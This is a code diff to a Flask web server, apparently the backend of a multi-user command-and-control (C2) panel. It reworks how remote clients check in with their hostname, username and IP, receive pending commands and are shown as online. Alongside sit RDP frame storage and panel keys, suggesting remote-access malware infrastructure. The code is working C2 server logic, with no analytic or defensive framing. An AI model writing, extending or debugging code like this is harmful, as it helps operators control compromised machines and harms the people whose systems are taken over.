@@ -18,6 +18,9 @@ app = Flask(__name__, static_folder='public')
 rdp_frames = {}
 rdp_frames_lock = threading.Lock()
 
+active_clients = {}
+active_clients_lock = threading.Lock()
+
 # Paths setup
 BASE_DIR = os.path.abspath(os.path.dirname(__file__))
 DATA_DIR = '/data' if os.path.isdir('/data') else BASE_DIR
@@ -794,39 +797,6 @@ def admin_delete_invite(code):
 
 # ===== C2 ENDPOINTS =====
 
-@app.route('/api/c2/heartbeat', methods=['POST'])
-def c2_heartbeat():
-    key = request.headers.get('x-panel-key', '')
-    if not key:
-        return jsonify({'error': 'unauthorized'}), 401
-    with get_db() as db:
-        user = db.execute('SELECT id FROM users WHERE api_key = ?', (key,)).fetchone()
-        if not user:
-            return jsonify({'error': 'unauthorized'}), 401
-    owner_id = user['id']
-
-    data = request.json or {}
-    client_id = data.get('client_id', '')
-    hostname = data.get('hostname', '')
-    username = data.get('username', '')
-    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
-    if not client_id:
-        return jsonify({'error': 'missing client_id'}), 400
-
-    with get_db() as db:
-        db.execute('''
-            INSERT INTO clients (client_id, user_id, hostname, username, ip, last_heartbeat)
-            VALUES (?, ?, ?, ?, ?, CURRENT_TIMESTAMP)
-            ON CONFLICT(client_id) DO UPDATE SET
-                hostname = excluded.hostname,
-                username = excluded.username,
-                ip = excluded.ip,
-                last_heartbeat = CURRENT_TIMESTAMP
-        ''', (client_id, owner_id, hostname, username, ip))
-        db.commit()
-    return jsonify({'status': 'ok'})
-
-
 @app.route('/api/c2/command', methods=['GET'])
 def c2_get_command():
     key = request.headers.get('x-panel-key', '')
@@ -836,12 +806,31 @@ def c2_get_command():
         user = db.execute('SELECT id FROM users WHERE api_key = ?', (key,)).fetchone()
         if not user:
             return jsonify({'error': 'unauthorized'}), 401
+    owner_id = user['id']
 
     client_id = request.args.get('client_id', '')
+    hostname = request.args.get('hostname', '')
+    username = request.args.get('username', '')
     if not client_id:
         return jsonify({'command': ''})
 
+    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+
+    with active_clients_lock:
+        active_clients[client_id] = time.time()
+
     with get_db() as db:
+        db.execute('''
+            INSERT INTO clients (client_id, user_id, hostname, username, ip, last_heartbeat)
+            VALUES (?, ?, ?, ?, ?, CURRENT_TIMESTAMP)
+            ON CONFLICT(client_id) DO UPDATE SET
+                hostname = CASE WHEN excluded.hostname != '' THEN excluded.hostname ELSE clients.hostname END,
+                username = CASE WHEN excluded.username != '' THEN excluded.username ELSE clients.username END,
+                ip = excluded.ip,
+                last_heartbeat = CURRENT_TIMESTAMP
+        ''', (client_id, owner_id, hostname, username, ip))
+        db.commit()
+
         row = db.execute('SELECT pending_command FROM clients WHERE client_id = ?', (client_id,)).fetchone()
         if row and row['pending_command']:
             cmd = row['pending_command']
@@ -855,23 +844,25 @@ def c2_get_command():
 @login_required
 def c2_list_clients():
     user = request.current_user
+    now = time.time()
     with get_db() as db:
         rows = db.execute('''
-            SELECT client_id, hostname, username, ip, last_heartbeat, pending_command,
-                   CASE WHEN (strftime('%s','now') - strftime('%s', last_heartbeat)) < 35 THEN 1 ELSE 0 END as is_online
+            SELECT client_id, hostname, username, ip, last_heartbeat, pending_command
             FROM clients WHERE user_id = ? ORDER BY last_heartbeat DESC
         ''', (user['id'],)).fetchall()
     clients = []
-    for r in rows:
-        clients.append({
-            'client_id': r['client_id'],
-            'hostname': r['hostname'],
-            'username': r['username'],
-            'ip': r['ip'],
-            'last_heartbeat': r['last_heartbeat'],
-            'pending_command': r['pending_command'],
-            'is_online': bool(r['is_online'])
-        })
+    with active_clients_lock:
+        for r in rows:
+            last_seen = active_clients.get(r['client_id'], 0)
+            clients.append({
+                'client_id': r['client_id'],
+                'hostname': r['hostname'],
+                'username': r['username'],
+                'ip': r['ip'],
+                'last_heartbeat': r['last_heartbeat'],
+                'pending_command': r['pending_command'],
+                'is_online': (now - last_seen) < 15
+            })
     return jsonify(clients)
 
 
